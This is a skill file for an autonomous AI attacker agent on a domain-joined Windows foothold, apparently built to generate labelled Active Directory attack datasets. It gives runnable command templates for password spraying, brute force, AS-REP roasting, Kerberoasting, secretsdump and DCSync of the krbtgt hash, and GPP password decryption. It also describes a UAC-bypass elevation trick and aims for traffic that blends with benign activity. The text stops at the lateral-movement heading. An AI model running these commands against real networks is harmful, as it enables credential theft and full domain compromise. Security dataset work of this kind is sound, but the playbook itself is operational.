---
name: ad-attack
description: Active Directory penetration attack skill for an attacker agent running on a domain-joined Windows host with an initial foothold. Covers the ATT&CK phases of Discovery, Credential Access, Lateral Movement, and Persistence using impacket, kerbrute, and nmap. Every technique id maps to exactly one command. The skill is object-driven: a long-term APT state file (state.json) holds three knowledge partitions (domain, hosts, users) plus runtime tickets/files, and every command parameter is resolved from a referenced object in that file. Each task follows a strict protocol: validate the environment with a pre-flight script, read state, wrap each atomic action with tshark/Sysmon capture, write results back to state, and roll back stale information. Use this skill whenever an attacker task requires domain reconnaissance, credential abuse, lateral movement, ticket attacks, or persistence.
---

# AD Attack Skill

## Overview

This skill drives an attacker agent that operates from a Windows host already joined to the target Active Directory domain. Attacks are organized by MITRE ATT&CK phase, advance slowly over a long period (APT-style), and reuse normal AD protocols (Kerberos, NTLM, LDAP, SMB, MS-RPC) so the resulting traffic and Windows events mix with benign business activity.

The skill is object-driven and stateful:

- `state.json` is the single source of truth for every command parameter. It holds three knowledge partitions — `domain`, `hosts`, and `users` — plus runtime `tickets`, `files`, `techniques`, and `notes`.
- `changes.json` is the operator rollback ledger: every technique that mutates the target AD (new user, machine account, password reset, RBCD, DC config) must append one record. HolyFW does not revert the domain; the operator uses this file by hand.
- Each technique id maps to exactly one command.
- Every atomic action is bracketed by traffic and log capture so the produced dataset is observable and labelable.

## Directory Layout

```
attacker/skills/ad-attack/
├── SKILL.md                    # this file
├── config.json                 # interface, log channels (environment-specific)
├── state.json                  # long-term APT state (three knowledge partitions + runtime)
├── changes.json                # target-environment mutations for manual rollback
├── scripts/
│   ├── check_environment.py    # pre-flight validation (+ audit subcategory check)
│   ├── state.py                # read/update state.json
│   ├── changes.py              # append/read changes.json
│   ├── capture_traffic.py      # tshark start/stop
│   ├── capture_logs.py         # Sysmon + Security event-log start/stop (one evtx per channel)
│   └── elevate.py              # run a command elevated via a one-shot scheduled task
```

Captures are written to `attacker/logs/YYYY-MM-DD/` when the scheduler sets `HOLYFW_ATTACKER_OUTPUT_DIR`. File names are `{task_id}_{technique-id}.pcapng` and `{task_id}_{technique-id}_{channel}.evtx` (no timestamp suffix). `config.json` `output_dir` is only the fallback for a manual skill run.

All script invocations below use `python`; the attacker scheduler starts OpenCode with cwd at the installed skill root so relative `wordlists/` paths resolve. If you run a script by hand, do it from the skill root.

## Tool Naming & Windows Invocation

impacket is pure Python and runs natively on Windows; Kali is not required. Every impacket command in this skill uses the PATH-independent form `python -m impacket.examples.<name>`, which works on Windows (`pip install impacket`) and Kali alike. Module names map to the classic script names as follows:

| Module used in commands | Windows `*.py` script | Kali `impacket-` command |
|-------------------------|-----------------------|--------------------------|
| `secretsdump` | `secretsdump.py` | `impacket-secretsdump` |
| `GetADUsers` | `GetADUsers.py` | `impacket-GetADUsers` |
| `lookupsid` | `lookupsid.py` | `impacket-lookupsid` |
| `GetNPUsers` | `GetNPUsers.py` | `impacket-GetNPUsers` |
| `GetUserSPNs` | `GetUserSPNs.py` | `impacket-GetUserSPNs` |
| `Get-GPPPassword` | `Get-GPPPassword.py` | `impacket-Get-GPPPassword` |
| `getTGT` | `getTGT.py` | `impacket-getTGT` |
| `getST` | `getST.py` | `impacket-getST` |
| `ticketer` | `ticketer.py` | `impacket-ticketer` |
| `findDelegation` | `findDelegation.py` | `impacket-findDelegation` |
| `psexec` | `psexec.py` | `impacket-psexec` |
| `wmiexec` | `wmiexec.py` | `impacket-wmiexec` |
| `smbexec` | `smbexec.py` | `impacket-smbexec` |
| `atexec` | `atexec.py` | `impacket-atexec` |
| `dcomexec` | `dcomexec.py` | `impacket-dcomexec` |
| `smbclient` | `smbclient.py` | `impacket-smbclient` |
| `addcomputer` | `addcomputer.py` | `impacket-addcomputer` |
| `rbcd` | `rbcd.py` | `impacket-rbcd` |
| `smbpasswd` | `smbpasswd.py` | `impacket-smbpasswd` |

On Windows, run any impacket script with one of these equivalent forms (flags are identical on every platform):

```
python psexec.py -hashes :<ntlm-hash> <domain.name>/<user>@<target-ip>
python -m impacket.examples.psexec -hashes :<ntlm-hash> <domain.name>/<user>@<target-ip>
```

Prefer `python -m impacket.examples.<name>`: it works regardless of whether Python's `Scripts` directory is on the PATH. Installation on the attacker host:

```
pip install impacket
```

For ticket use, set `KRB5CCNAME` according to the active shell:

- PowerShell: `$env:KRB5CCNAME = "<user>.ccache"`
- cmd: `set KRB5CCNAME=<user>.ccache`

In PowerShell, wrap any password containing `$`, backtick, or other special characters in single quotes.

## Mandatory Execution Protocol

Every attack task MUST follow this exact sequence. Do not skip steps.

### Step 0 — Pre-flight check (once per day of attack activity)

Run:

```
python scripts/check_environment.py
```

- `"ok": true` (warnings are acceptable) means continue to Step 1.
- `"ok": false` is diagnostic, not a stop. Read the `errors` array, remediate what you can, then continue to Step 1 and execute the dispatched technique. Typical remediations: local permission failures (unreadable Sysmon/Security logs, `auditpol` access denied, `admin.is_admin` false) → read `state.json` for a local-administrator account and wrap the blocked command with `scripts/elevate.py`; a configured tshark interface missing from `tshark_interfaces` → run `tshark -D` yourself and use a matching name. Never substitute a missing executable with a guessed tool, never invent a command, and never kill `python.exe` / `opencode.exe` / `attacker.exe` or any PID this task did not start (see AGENTS.md process lifetime).

The check also guarantees impacket is actually runnable: it reports `python_executable` (the interpreter running the check — the same `python` the attack commands below will use) and `impacket.impacket_file` (where impacket lives), and it executes `python -m impacket.examples.secretsdump --help` as a live proof. If those do not line up, `ok` is `false`.

> **Elevation requirement.** Capturing `.evtx` requires read access to the Sysmon **and Security** logs. `capture_logs.py stop` runs `wevtutil epl` and, on access denied, retries through `scripts/elevate.py` using `campaign.local_admin` (or a `users[]` entry with `is_local_admin`). The pre-flight report still probes `channels_readable`; `ok: false` there means remediate and continue, not abort. Prefer running the attacker agent elevated; `admin.is_admin` is a reference field only.

> **Local elevation (when permission is denied on the attack host).** If the agent's shell lacks the rights to install/update Sysmon (`sysmon64 -c/-i`), run `auditpol`, or export the Sysmon/Security logs, elevate the specific command with `scripts/elevate.py` — it launches the command through a one-shot **scheduled task** (`schtasks /ru <account> /rp <password>`), which runs with the account's *full* (unfiltered) token because the Task Scheduler service runs as SYSTEM, bypassing UAC token filtering. `runas` cannot be used from an unattended shell (it reads the password from the console). Example:
>
> ```
> # as a local administrator (full token: check the High Integrity Level)
> python scripts/elevate.py --user ATYdemo --password '<pw>' -- whoami /groups
>
> # as a domain admin already in the local Administrators group
> python scripts/elevate.py --user NDRTEST\<da> --password '<pw>' -- sysmon64.exe -c C:\path\sysmonconfig.xml
>
> # the elevated process does NOT inherit this user's environment — pass PYTHONPATH etc. via --env
> python scripts/elevate.py --user ATYdemo --password '<pw>' \
>     --env 'PYTHONPATH=C:\...\impacket;C:\Users\...\AppData\Roaming\Python\Python314\site-packages' \
>     -- C:\Python314\python.exe -c "import impacket; print(impacket.__file__)"
> ```
>
> The target account must be a member of the local `Administrators` group (the `Domain Admins` group usually is, by default). Commands are wrapped in a temp batch, output is captured to a temp file, and everything is cleaned up automatically.

> **Logon/Kerberos audit events.** `capture_logs.py` also exports the **Security** log (`config.json` `logs.security_log`), which records logon/authentication events: `4624/4625` (logon success/failure), `4634` (logoff), `4672` (special logon), `4648` (explicit credentials), `4776` (NTLM credential validation), and — on a **domain controller** — `4768` (TGT) / `4769` (service ticket). The pre-flight report's `auditing` field checks these audit subcategories (via `auditpol /get /subcategory:<GUID>`); if any are disabled, `ok` stays `true` but a warning explains which `auditpol` subcategory to enable. Note: `4768/4769` are emitted by the KDC, so they appear in a DC's Security log, not on the attack host; the attack host's Security log captures its own network logons (`4624` LogonType 3) from lateral-movement tooling.

### Step 1 — Read the state file and resolve the object references

Read the long-term state:

```
python scripts/state.py read
```

The task references objects by name (e.g. `user svc_backup`, `host 192.168.14.71`). Resolve each reference to its fields in `state.json`. Every command parameter (domain name, DC IP, username, hash, ccache file, SPN, etc.) MUST come from the resolved object. Never invent credentials, hashes, hostnames, or targets. If a referenced object or its required field is missing from the state, mark the technique `failed` with that reason and end this task. Do not substitute another technique from the catalog to fill the gap (the scheduler will dispatch that technique later). Environment problems (unreadable logs, a tshark interface mismatch) are remediable in this task via `scripts/elevate.py` / `tshark -D`.

### Step 2 — Wrap each atomic action with capture

For every single atomic attack action (one command = one action):

1. Start traffic capture:

   ```
   python scripts/capture_traffic.py start --label <technique-id>
   ```

2. Start log capture:

   ```
   python scripts/capture_logs.py start --label <technique-id>
   ```

3. Execute the attack command.
4. Stop log capture and export the evtx (one `.evtx` per channel — Sysmon + Security):

   ```
   python scripts/capture_logs.py stop
   ```

5. Stop traffic capture and finalize the pcap:

   ```
   python scripts/capture_traffic.py stop
   ```

`<technique-id>` is the stable identifier of the technique (see each technique below). The capture start/stop calls must bracket the action even when the action fails, so the failed attempt is still recorded. `capture_logs.py stop` writes one evtx per configured channel named `{task_id}_{label}_{channel}.evtx` (e.g. `a1b2c3d4e5f67890_pass-the-ticket_Security.evtx`); a channel that fails to export does not block the others.

### Step 3 — Update the state file

Write the outcome back into the state file using `state.py` (see the "Outputs" block of each technique). On success, mark the technique `done`; on failure, mark it `failed` and record the reason.

### Step 4 — Rollback on stale information

If a command fails because a state object's field is wrong (a hash that does not authenticate, a DC IP that is unreachable, a credential that is rejected), the object is stale. Mark it stale and re-collect it:

```
python scripts/state.py mark-stale <path-to-the-object>
```

Mark it stale. Do **not** re-run a different technique in this task. The scheduler will dispatch the producing technique later.

---

## State File Reference (state.json)

The state file is divided into three knowledge partitions (`domain`, `hosts`, `users`) plus runtime sections (`tickets`, `files`, `techniques`, `notes`).

### 1. Domain basic information — `domain`

| Field | Meaning |
|-------|---------|
| `name` | Domain FQDN, e.g. `corp.local` |
| `netbios` | NetBIOS (pre-Windows 2000) name |
| `dc_fqdn` | Primary domain controller FQDN (convenience pointer used for `-dc-ip` and ticket targets) |
| `dc_ip` | Primary domain controller IP address |
| `dcs[]` | All discovered domain controllers (see shape below) |
| `domain_sid` | Domain SID, e.g. `S-1-5-21-...` |
| `user_count` | Number of user accounts |
| `computer_count` | Number of computer accounts |
| `usernames[]` | Flat list of discovered SAM account names (kerbrute/enumeration working list) |
| `spns[]` | All discovered service principal names (see shape below) |
| `delegation[]` | Delegation relationships (see shape below) |
| `groups[]` | Discovered domain security group names |
| `password_policy` | Domain password/lockout policy (see shape below) |
| `trusts[]` | Domain/forest trust relationships (see shape below) |
| `rbcd[]` | Resource-based constrained delegation edges (see shape below) |
| `updated_at` | Last modification time |

`domain.dcs[]` item shape:

```
{"fqdn": "dc01.corp.local", "ip": "10.0.0.2", "is_pdc": true, "stale": false, "updated_at": ""}
```

`domain.password_policy` shape:

```
{"lockout_threshold": 5, "min_password_length": 7, "max_password_age_days": 42}
```

`domain.trusts[]` item shape:

```
{"target": "child.corp.local", "direction": "inbound|outbound|bidirectional", "type": "parentchild|treeroot|forest|external", "stale": false, "updated_at": ""}
```

`domain.rbcd[]` item shape:

```
{"delegate_from": "ATTACKER$", "delegate_to": "DC01$", "stale": false, "updated_at": ""}
```

`domain.spns[]` item shape:

```
{"spn": "cifs/dc01.corp.local", "account": "svc_sql", "ticket_file": "", "stale": false, "updated_at": ""}
```

`domain.delegation[]` item shape:

```
{"account": "dc01$", "type": "unconstrained|constrained", "allowed_spns": [], "stale": false, "updated_at": ""}
```

### 2. Host information — `hosts[]`

One object per domain controller, server, or member machine. Item shape:

```
{
  "machine_account": "DC01$",
  "fqdn": "dc01.corp.local",
  "ip": "10.0.0.2",
  "os": "Windows Server 2019",
  "role": "dc|server|member|unknown",
  "services": ["SMB", "LDAP", "DNS"],
  "open_ports": [88, 135, 389, 445],
  "shares": ["Company_Data", "Public"],
  "compromised": false,
  "source": "discovery.host-scan",
  "stale": false,
  "updated_at": ""
}
```

### 3. User information — `users[]`

One object per account that carries any credential or attribute detail. Item shape:

```
{
  "username": "svc_backup",
  "upn": "svc_backup@corp.local",
  "sid": "S-1-5-21-...-1106",
  "password": "",
  "lm_hash": "",
  "ntlm_hash": "",
  "kerberos_rc4": "",
  "kerberos_aes128": "",
  "kerberos_aes256": "",
  "no_preauth": false,
  "logon_hosts": ["10.0.0.15"],
  "groups": ["Backup Operators"],
  "spns": ["MSSQLSvc/sql01.corp.local"],
  "is_domain_admin": false,
  "is_service_account": true,
  "is_machine_account": false,
  "source": "credential.dcsync",
  "stale": false,
  "updated_at": ""
}
```

Field notes:

- `password` is the plaintext password when known.
- `ntlm_hash` is the NTLM hash (second half of `LM:NT`). `lm_hash` holds the LM half when known.
- `kerberos_rc4` / `kerberos_aes128` / `kerberos_aes256` are Kerberos keys recovered from secretsdump/DCSync (`kerberos_rc4` equals `ntlm_hash`).
- `no_preauth` marks an account that does not require Kerberos preauthentication (AS-REP roastable).
- `logon_hosts` lists hosts where this account has been observed logging on.
- `groups` lists security groups the account belongs to.
- `spns` lists SPNs registered to this service account.
- `is_machine_account` marks a computer account (ends with `$`, created by `persistence.add-computer`).

### 4. Wordlists — `wordlists`

Local dictionary files used as input to kerbrute/impacket:

| Field | Meaning |
|-------|---------|
| `usernames` | Path to the username wordlist `.txt` (one username per line) |
| `passwords` | Path to the password wordlist `.txt` (one password per line) |
| `combos` | Path to a pre-generated `username:password` combo file (one `user:pass` pair per line), built from `usernames` × `passwords`; consumed by `credential.brute-force` |

Paths are relative to the skill root by default (or absolute). These files are operator-provided inputs; the fields store their locations so techniques that need a user/password list resolve the path from state instead of the prompt.

### 5. Campaign resources — `campaign`

Attacker-owned/decided values that are not discovered facts:

| Field | Meaning |
|-------|---------|
| `machine_account.name` / `password` | The machine account name (ends with `$`) and password created by `persistence.add-computer` and reused by `persistence.rbcd` |
| `local_admin.username` / `password` | Local Administrators account used by `scripts/elevate.py` and by `capture_logs.py stop` when `wevtutil epl` is denied. Also accepted: a `users[]` entry with `is_local_admin: true`. |
| `tools_dir` | Local directory that holds attacker tools (relative to the skill root or absolute) |
| `tools[]` | Local tool filenames used by `lateral.tool-transfer` (e.g. `mimikatz.exe`) |

### 6. Runtime sections

- `tickets.tgt[]` / `service[]` / `golden[]` / `silver[]`: ticket cache files produced or forged during the campaign. Every entry carries `principal` (the user to authenticate as) and `ccache_file`; `service[]`/`silver[]` additionally carry `spn`, and `service[]` also keeps `impersonated_user` as a semantic label.
- `files[]`: interesting files discovered on hosts. Item shape: `{"path": "...", "description": "...", "stale": false, "updated_at": "..."}`.
- `techniques`: per-technique status and last result (keyed by technique id).
- `notes[]`: free-form observations. Item shape: `{"text": "..."}`.

### 7. Environment-change ledger — `changes.json`

Whenever a technique **creates or alters an object in the target domain** (not local tickets, pcaps, or `state.json` itself), append one record after the action succeeds. Do not revert the domain from this skill.

```
python scripts/changes.py add '{"kind": "<kind>", "technique_id": "<technique-id>", "target": "<account-or-object>", "summary": "<what changed>", "reversal": "<operator command to undo>"}'
```

`kind` is one of: `create_user`, `create_machine_account`, `reset_password`, `rbcd`, `dc_config`, `other`. `reversal` is a hint for the human operator (PowerShell / AD command); HolyFW never executes it.

Every object carries `stale` and `updated_at` (managed by `state.py mark-stale` / `unset-stale` / `touch`) so freshness is always visible.

---

## Command Templates

Task text follows one uniform, object-based form. The task generator is expected to receive the full `state.json` and pick concrete objects from it:

```
Use the ad-attack skill: using the <field> of <object>, execute <technique-id> against <target-ref>.
```

Reference grammar:

- `<object>`: `user <username|upn|sid>`, `host <ip|fqdn|machine_account>`, `domain`, or `wordlists`.
- `<field>`: the object attribute to use (e.g. `password`, `ntlm_hash`, `kerberos_aes256`, `usernames`, `passwords`, `spns`, `open_ports`, `os`, `dc_ip`, `domain_sid`).
- `<target-ref>`: `host <ip|fqdn|machine_account>`, `domain`, or `subnet <cidr>`.
- The `using the <field> of <object>` clause is omitted for techniques with no source object (orientation, host-scan, port-scan).

The technique id determines which field is actually consumed (see each technique's "Inputs"). The `using` clause just names the source object; the `against` clause names the target.

Examples:

```
Use the ad-attack skill: execute discovery.orientation against domain.
Use the ad-attack skill: execute discovery.host-scan against subnet 192.168.14.0/24.
Use the ad-attack skill: execute discovery.port-scan against host 192.168.14.71.
Use the ad-attack skill: using the usernames of wordlists, execute discovery.user-enum-kerbrute against domain.
Use the ad-attack skill: using the password of user alice, execute discovery.user-enum-ldap against domain.
Use the ad-attack skill: using the usernames of wordlists, execute credential.password-spray against domain.
Use the ad-attack skill: using the passwords of wordlists, execute credential.brute-user against domain.
Use the ad-attack skill: using the password of user alice, execute credential.kerberoast against domain.
Use the ad-attack skill: using the ntlm_hash of user svc_backup, execute lateral.pth-psexec against host 192.168.14.71.
Use the ad-attack skill: using the ntlm_hash of user administrator, execute lateral.overpass-the-hash against domain.
Use the ad-attack skill: using the password of user alice, execute lateral.exec-wmiexec against host 192.168.14.71.
Use the ad-attack skill: using the password of user alice, execute lateral.delegation-enum against domain.
Use the ad-attack skill: using the password of user svc_sql, execute lateral.delegation-s4u against host 192.168.14.71.
Use the ad-attack skill: using the ntlm_hash of user krbtgt, execute persistence.golden-ticket against domain.
Use the ad-attack skill: using the ntlm_hash of user svc_sql, execute persistence.silver-ticket against host 192.168.14.71.
```

The only parameter that may originate outside `state.json` is a single candidate password for spraying (the user/password wordlist paths themselves come from `wordlists`).

---

## Phase 0: Orientation

Before any attack, discover the domain context from the local foothold and store it.

- Technique id: `discovery.orientation`
- ATT&CK: T1082 (System Information Discovery), T1016 (System Network Configuration Discovery), T1482 (Domain Trust Discovery)

Commands:

```
whoami /upn
whoami /user
ipconfig /all
systeminfo
nltest /dclist:<domain>
net time /domain
```

Outputs:

```
python scripts/state.py set domain.name "<domain-fqdn>"
python scripts/state.py set domain.netbios "<netbios-name>"
python scripts/state.py set domain.domain_sid "<domain-sid>"
python scripts/state.py set domain.dc_ip "<primary-dc-ip>"
python scripts/state.py set domain.dc_fqdn "<primary-dc-fqdn>"
python scripts/state.py add domain.dcs '{"fqdn": "<dc-fqdn>", "ip": "<dc-ip>", "is_pdc": true}'
```

- `nltest /dclist:<domain>` lists **every** DC. Record each one with its own `add domain.dcs` entry (mark the PDC `is_pdc: true`), and set the singular `dc_ip`/`dc_fqdn` to the primary (PDC) so `-dc-ip` targets resolve.
- Derive `domain_sid` from `whoami /user`: take the user SID and drop the trailing RID (the part after the last `-`).
- This is information gathering, not an attack action, so no capture brackets are required.

---

# Phase 1: Discovery

## 1.1 Host Discovery (IP Scan)

- Technique id: `discovery.host-scan`
- ATT&CK: T1018 (Remote System Discovery)

Purpose: enumerate live hosts in the domain subnet.

Inputs: the target subnet from the `against subnet <cidr>` clause or `domain.dc_ip`.

Procedure (one atomic action):

```
nmap -sn <subnet>
```

For firewalled environments:

```
nmap -Pn -sn <subnet>
```

Outputs: append each live host to `hosts`:

```
python scripts/state.py add hosts '{"ip": "<ip>", "role": "unknown", "open_ports": [], "services": [], "compromised": false, "source": "discovery.host-scan"}'
```

Rollback: not applicable (a failed scan is simply re-run).

## 1.2 Single-Host Port Scan

- Technique id: `discovery.port-scan`
- ATT&CK: T1046 (Network Service Discovery)

Purpose: enumerate open ports and services on one host.

Inputs: the target host object from `hosts` (or `domain.dc_ip`).

Procedure (one atomic action):

```
nmap -Pn -sT -p- <target-ip>
```

Focused AD-port scan:

```
nmap -Pn -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,5986,9389 <target-ip>
```

Outputs: update the host object's `open_ports`, `services`, `os`, `role`:

```
python scripts/state.py merge hosts[<index>] '{"open_ports": [445, 135], "services": ["SMB", "MS-RPC"], "os": "<os>", "role": "<role>"}'
```

Rollback: not applicable.

## 1.3 Username Enumeration (kerbrute)

- Technique id: `discovery.user-enum-kerbrute`
- ATT&CK: T1087.002 (Account Discovery: Domain Account)

Purpose: enumerate valid domain usernames without credentials (Kerberos pre-authentication behavior).

Inputs: `domain.name`, `domain.dc_ip`, and `wordlists.usernames` (the username wordlist path).

Procedure (one atomic action):

```
kerbrute userenum -d <domain.name> --dc <domain.dc_ip> <userlist>
```

Outputs: append each discovered username to `domain.usernames`:

```
python scripts/state.py add domain.usernames '"<username>"'
```

Rollback: if a username list is later found to contain dead accounts, re-run this technique to refresh it.

## 1.4 Username Enumeration (LDAP)

- Technique id: `discovery.user-enum-ldap`
- ATT&CK: T1087.002 (Account Discovery: Domain Account)

Purpose: list all domain users via LDAP with valid credentials.

Inputs: a user object with `password` from `users`, plus `domain.dc_ip`.

Procedure (one atomic action):

```
python -m impacket.examples.GetADUsers -all -dc-ip <domain.dc_ip> <domain.name>/<user>:<password>
```

Outputs: append enumerated usernames to `domain.usernames` and set the count:

```
python scripts/state.py add domain.usernames '"<username>"'
python scripts/state.py set domain.user_count <n>
```

Rollback: if the credential is rejected, `mark-stale` the user object and refresh it.

## 1.5 SID Enumeration

- Technique id: `discovery.user-enum-sid`
- ATT&CK: T1087.002 (Account Discovery: Domain Account)

Purpose: enumerate accounts and SIDs with valid credentials.

Inputs: a user object with `password` from `users`, plus `domain.dc_ip`.

Procedure (one atomic action):

```
python -m impacket.examples.lookupsid <domain.name>/<user>:<password>@<domain.dc_ip>
```

Outputs: append enumerated accounts to `domain.usernames` and record SIDs on user objects:

```
python scripts/state.py add domain.usernames '"<username>"'
```

Rollback: if the credential is rejected, `mark-stale` the user object and refresh it.

## 1.6 Network Share Enumeration

- Technique id: `discovery.share-enum`
- ATT&CK: T1135 (Network Share Discovery)

Purpose: enumerate SMB shares on a host.

Inputs: a host object from `hosts` (ip/fqdn), and a user object from `users` if the listing requires authentication.

Procedure (one atomic action):

```
net view \\<target-ip>
```

Alternative with impacket:

```
python -m impacket.examples.smbclient -no-pass -k <domain.name>/<user>@<target-fqdn>
```

Then run `shares` inside the client.

Outputs: record the share names on the host object:

```
python scripts/state.py merge hosts[<index>] '{"shares": ["Company_Data", "Public"]}'
```

Rollback: if a share list is stale, `mark-stale` the host object and re-run this technique.

## 1.7 Domain Group Enumeration

- Technique id: `discovery.group-enum`
- ATT&CK: T1069.002 (Permission Groups Discovery: Domain Groups)

Purpose: enumerate domain security groups and their members.

Inputs: `domain.name`, optionally an account from `users`.

Procedure (one atomic action):

```
net group /domain
net group "Domain Admins" /domain
```

Outputs: record group names and map members onto user objects:

```
python scripts/state.py add domain.groups '"Domain Admins"'
python scripts/state.py merge users[<index>] '{"groups": ["Domain Admins"]}'
```

Rollback: if group membership is stale, `mark-stale` the user/group entry and re-run.

## 1.8 Password Policy Discovery

- Technique id: `discovery.password-policy`
- ATT&CK: T1201 (Password Policy Discovery)

Purpose: read the domain password/lockout policy before spraying.

Inputs: none (domain context).

Procedure (one atomic action):

```
net accounts /domain
```

Outputs:

```
python scripts/state.py set domain.password_policy '{"lockout_threshold": 5, "min_password_length": 7, "max_password_age_days": 42}'
```

Rollback: not applicable (re-run if the policy changes).

## 1.9 Domain Trust Discovery

- Technique id: `discovery.trust-enum`
- ATT&CK: T1482 (Domain Trust Discovery)

Purpose: enumerate trust relationships.

Inputs: none.

Procedure (one atomic action):

```
nltest /domain_trusts
nltest /trusted_domains
```

Outputs:

```
python scripts/state.py add domain.trusts '{"target": "child.corp.local", "direction": "bidirectional", "type": "parentchild"}'
```

Rollback: not applicable (re-run if the trust topology changes).

## 1.10 Host Identification (reverse DNS)

- Technique id: `discovery.host-identify`
- ATT&CK: T1018 (Remote System Discovery), T1040 (Network Sniffing - hostname resolution)

Purpose: resolve a host's FQDN and machine account name from its IP (fills fields required by Kerberos/ticket commands and RBCD).

Inputs: a host object with `ip` from `hosts`.

Procedure (one atomic action):

```
nslookup <target-ip>
ping -a <target-ip>
```

Outputs: derive the FQDN and the machine account name (hostname without domain + `$`) and write them back:

```
python scripts/state.py merge hosts[<index>] '{"fqdn": "<host>.<domain.name>", "machine_account": "<hostname>$"}'
```

Rollback: if the FQDN/machine account no longer resolves, `mark-stale` the host object and re-run this technique.

---

# Phase 2: Credential Access

## 2.1 Password Spraying

- Technique id: `credential.password-spray`
- ATT&CK: T1110.003 (Brute Force: Password Spraying)

Purpose: test a single password against many accounts.

Inputs: `wordlists.usernames` (user list), `domain.name`, `domain.dc_ip`, and a candidate password (from `wordlists.passwords` or a single candidate in the task text).

Procedure (one atomic action):

```
kerbrute passwordspray -d <domain.name> --dc <domain.dc_ip> <userlist> <password>
```

Outputs: for each valid credential found, add a user object:

```
python scripts/state.py add users '{"username": "<user>", "password": "<password>", "source": "credential.password-spray"}'
```

Rollback: if a sprayed credential is later rejected, `mark-stale` the user object and re-spray or re-enumerate that account.

## 2.2 Single-Account Brute Force

- Technique id: `credential.brute-user`
- ATT&CK: T1110.001 (Brute Force: Password Guessing)

Purpose: brute-force a single account against a password list.

Inputs: a single username (from `domain.usernames`), `wordlists.passwords` (password list), `domain.name`, `domain.dc_ip`.

Procedure (one atomic action):

```
kerbrute bruteuser -d <domain.name> --dc <domain.dc_ip> <passlist> <user>
```

Outputs: add a user object for a valid credential:

```
python scripts/state.py add users '{"username": "<user>", "password": "<password>", "source": "credential.brute-user"}'
```

Rollback: if a credential is later rejected, `mark-stale` the user object and re-enumerate.

## 2.3 Brute Force

- Technique id: `credential.brute-force`
- ATT&CK: T1110 (Brute Force)

Purpose: brute-force many accounts against a password list.

Inputs: `wordlists.combos` (a `username:password` combo file built from `wordlists.usernames` × `wordlists.passwords`), `domain.name`, `domain.dc_ip`.

Procedure (one atomic action):

```
kerbrute bruteforce -d <domain.name> --dc <domain.dc_ip> <wordlists.combos>
```

`kerbrute bruteforce` accepts exactly one `<user_pw_file>` argument (a combo file of `username:password` pairs, one per line) — not separate passlist + userlist. The combo file is operator-provided in `wordlists.combos`; failed guesses count against the lockout threshold.

Outputs: add a user object for each valid credential:

```
python scripts/state.py add users '{"username": "<user>", "password": "<password>", "source": "credential.brute-force"}'
```

Rollback: if a credential is later rejected, `mark-stale` the user object and re-enumerate.

## 2.4 AS-REP Roasting

- Technique id: `credential.asrep-roast`
- ATT&CK: T1558.004 (Steal or Forge Kerberos Tickets: AS-REP Roasting)

Purpose: request TGTs for accounts without Kerberos preauthentication.

Inputs: `wordlists.usernames` (user list), `domain.name`, `domain.dc_ip`.

Procedure (one atomic action):

```
python -m impacket.examples.GetNPUsers <domain.name>/ -usersfile <userlist> -dc-ip <domain.dc_ip> -format hashcat -outputfile asreproast.txt
```

Outputs: mark affected accounts `no_preauth` and record the output file:

```
python scripts/state.py add users '{"username": "<user>", "no_preauth": true, "source": "credential.asrep-roast"}'
python scripts/state.py add files '{"path": "asreproast.txt", "description": "AS-REP roast output"}'
```

Rollback: if an AS-REP entry fails to crack or is stale, re-run the roast for that user.

## 2.5 Kerberoasting

- Technique id: `credential.kerberoast`
- ATT&CK: T1558.003 (Steal or Forge Kerberos Tickets: Kerberoasting)

Purpose: request service tickets for SPNs and recover service account hashes.

Inputs: a user object with `password` from `users`, plus `domain.dc_ip`.

Procedure (one atomic action):

```
python -m impacket.examples.GetUserSPNs -dc-ip <domain.dc_ip> <domain.name>/<user>:<password> -request
```

Outputs: append discovered SPNs to `domain.spns` and mark the service account:

```
python scripts/state.py add domain.spns '{"spn": "<spn>", "account": "<service-account>"}'
python scripts/state.py add users '{"username": "<service-account>", "spns": ["<spn>"], "is_service_account": true, "source": "credential.kerberoast"}'
```

Rollback: if a stored SPN no longer resolves, `mark-stale` it and re-run Kerberoasting.

## 2.6 Credential Dumping (SAM/LSA)

- Technique id: `credential.dump-secrets`
- ATT&CK: T1003 (OS Credential Dumping)

Purpose: dump local account hashes from a host.

Inputs: a user object (use `password` or `ntlm_hash`) from `users`, plus the target host.

Procedure (one atomic action). Use `:<password>` if the object has a plaintext password, or `-hashes :<ntlm-hash>` if only the hash is known:

```
python -m impacket.examples.secretsdump <domain.name>/<user>:<password>@<target-ip>
```

```
python -m impacket.examples.secretsdump -hashes :<ntlm-hash> <domain.name>/<user>@<target-ip>
```

Outputs: append recovered accounts to `users` (set `ntlm_hash`/`kerberos_rc4`, leave `password` empty when only the hash is known) and record logon hosts:

```
python scripts/state.py add users '{"username": "<user>", "ntlm_hash": "<hash>", "kerberos_rc4": "<hash>", "logon_hosts": ["<target-ip>"], "source": "credential.dump-secrets"}'
```

Rollback: if a dumped hash later fails to authenticate, `mark-stale` it and re-dump.

## 2.7 DCSync

- Technique id: `credential.dcsync`
- ATT&CK: T1003.006 (OS Credential Dumping: DCSync)

Purpose: replicate directory secrets, including the `krbtgt` hash (required for golden tickets).

Inputs: an admin user object with `password`/`ntlm_hash` from `users`.

Procedure (one atomic action):

```
python -m impacket.examples.secretsdump <domain.name>/<admin-user>:<password>@<domain.dc_ip> -just-dc
```

`krbtgt` only (sub-variant of the same command):

```
python -m impacket.examples.secretsdump <domain.name>/<admin-user>:<password>@<domain.dc_ip> -just-dc-user krbtgt
```

Outputs: store the `krbtgt` hash and any new account hashes in `users`, and record the domain SID:

```
python scripts/state.py add users '{"username": "krbtgt", "ntlm_hash": "<hash>", "kerberos_rc4": "<hash>", "source": "credential.dcsync"}'
python scripts/state.py set domain.domain_sid "<domain-sid>"
```

Rollback: if the `krbtgt` hash is suspected stale (rotated), `mark-stale` the `krbtgt` user object and re-run DCSync.

## 2.8 GPP Password (cPassword)

- Technique id: `credential.gpp-password`
- ATT&CK: T1552.006 (Unsecured Credentials: Group Policy Preferences)

Purpose: decrypt cPassword values from SYSVOL group-policy preference files.

Inputs: `domain.name`, `domain.dc_ip`, and an account with `password` from `users`.

Procedure (one atomic action):

```
python -m impacket.examples.Get-GPPPassword -dc-ip <domain.dc_ip> <domain.name>/<user>:<password>@<domain.dc_fqdn>
```

Outputs: for each decrypted credential, add a user object:

```
python scripts/state.py add users '{"username": "<user>", "password": "<decrypted>", "source": "credential.gpp-password"}'
```

Rollback: if a GPP credential is later rejected, `mark-stale` the user object and re-run this technique.

---

# Phase 3: Lateral Movement

## 3.1 Pass-the-Hash (PsExec)

- Technique id: `lateral.pth-psexec`
